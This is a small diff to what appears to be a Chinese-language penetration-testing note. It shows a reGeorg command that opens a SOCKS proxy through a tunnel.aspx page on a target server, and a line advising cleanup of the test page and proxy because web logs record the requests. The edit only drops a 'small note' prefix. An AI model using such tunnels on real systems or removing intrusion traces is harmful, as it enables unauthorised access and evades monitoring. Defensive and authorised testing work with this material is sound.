@@ -24,4 +24,4 @@ python3 reGeorgSocksProxy.py -u http://target/tunnel.aspx -p 1080
 lsof -i :1080
 ```
 
-小记录：测试页和代理进程要及时清理，Web 日志里会有明显请求痕迹。
+测试页和代理进程要及时清理，Web 日志里会有明显请求痕迹。
